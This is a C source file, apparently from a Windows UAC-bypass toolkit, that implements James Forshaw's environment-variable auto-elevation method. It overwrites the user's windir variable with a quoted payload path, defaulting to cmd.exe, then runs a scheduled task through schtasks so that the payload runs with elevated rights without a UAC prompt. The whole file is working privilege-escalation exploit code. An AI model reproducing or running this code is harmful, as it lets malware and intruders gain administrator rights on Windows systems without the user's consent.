/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       TYRANID.C
*
*  VERSION:     2.72
*
*  DATE:        26 May 2017
*
*  James Forshaw autoelevation method(s)
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"


/*
* ucmDiskCleanupEnvironmentVariable
*
* Purpose:
*
* Use cleanmgr innovation implemented in Windows 10+.
* Cleanmgr.exe uses current user environment variables to build a path to the executable task.
* Warning: this method works with AlwaysNotify UAC level.
*
*/
BOOL ucmDiskCleanupEnvironmentVariable(
    _In_opt_ LPWSTR lpszPayload
)
{
    BOOL    bResult = FALSE, bCond = FALSE;
    LPWSTR  lpBuffer = NULL;
    WCHAR   szBuffer[MAX_PATH + 1];
    WCHAR   szEnvVariable[MAX_PATH * 2];

    do {

        if (lpszPayload != NULL) {
            lpBuffer = lpszPayload;
        }
        else {
            //no payload specified, use default cmd.exe
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
            lpBuffer = szBuffer;
        }

        //
        // Add quotes.
        //
        szEnvVariable[0] = L'\"';
        szEnvVariable[1] = 0;
        _strncpy(&szEnvVariable[1], MAX_PATH, lpBuffer, MAX_PATH);
        _strcat(szEnvVariable, L"\"");

        //
        // Set our controlled env.variable with payload.
        //
        if (!supSetEnvVariable(FALSE, T_WINDIR, szEnvVariable))
            break;

        //
        // Run trigger task.
        //
        bResult = supRunProcess(SCHTASKS_EXE, T_SCHTASKS_CMD);

        //
        // Cleaup our env.variable.
        //
        supSetEnvVariable(TRUE, T_WINDIR, NULL);

    } while (bCond);

    return bResult;
}
